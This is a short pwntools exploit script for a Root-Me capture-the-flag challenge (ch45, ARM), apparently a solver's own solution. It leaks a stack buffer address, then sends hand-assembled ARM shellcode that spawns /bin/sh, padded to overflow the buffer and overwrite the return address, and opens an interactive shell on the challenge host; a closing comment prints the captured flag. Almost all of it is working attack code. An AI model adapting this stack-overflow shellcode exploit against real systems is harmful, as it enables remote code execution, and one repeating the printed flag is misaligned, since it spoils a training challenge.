from pwn import *

#python -c "print 'A\ny\n\x01\x30\x8f\xe2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\nn'" | qemu-arm -g 1235 ./ch45

io = remote("challenge04.root-me.org", 61045)

Dump_again = io.recvuntil('dump:')
io.sendline("A")

data = io.recvuntil('(y/n):')

#leak top buffer address
leak = int(data[0:11], 16)
print leak, hex(leak)

io.sendline('y')
Dump_again = io.recvuntil('dump:')

#trigger buffer overflow
shellcode = ""
shellcode += '\x01\x30\x8f\xe2' 	#add r2, pc, #1
shellcode += '\x13\xff\x2f\xe1' 	#bx r3
shellcode += '\x02\xa0'	      		#add r0, pc, #8
shellcode += '\x49\x40'	      		#eors r1, r1
shellcode += '\x52\x40'         	#eors r2, r2
shellcode += '\xc2\x71'         	#strb r2, [r0, #7]
shellcode += '\x0b\x27'	      		#movs r7, #11
shellcode += '\x01\xdf'	      		#svc 1
shellcode += '\x2f\x62\x69\x6e'
shellcode += '\x2f\x73\x68\x78'

padding = 'A'*(164-len(shellcode))
payload = shellcode + padding + p32(leak)

#print payload + '\n' + 'n' + '\n'

io.sendline(payload)
data = io.recvuntil('(y/n):')
#print data
io.sendline('n')
io.interactive()



"""
cd /challenge/app-systeme/ch45
cat .passwd

0v3rfl0wing_buff3rs_l1k3_4_b0ss!
"""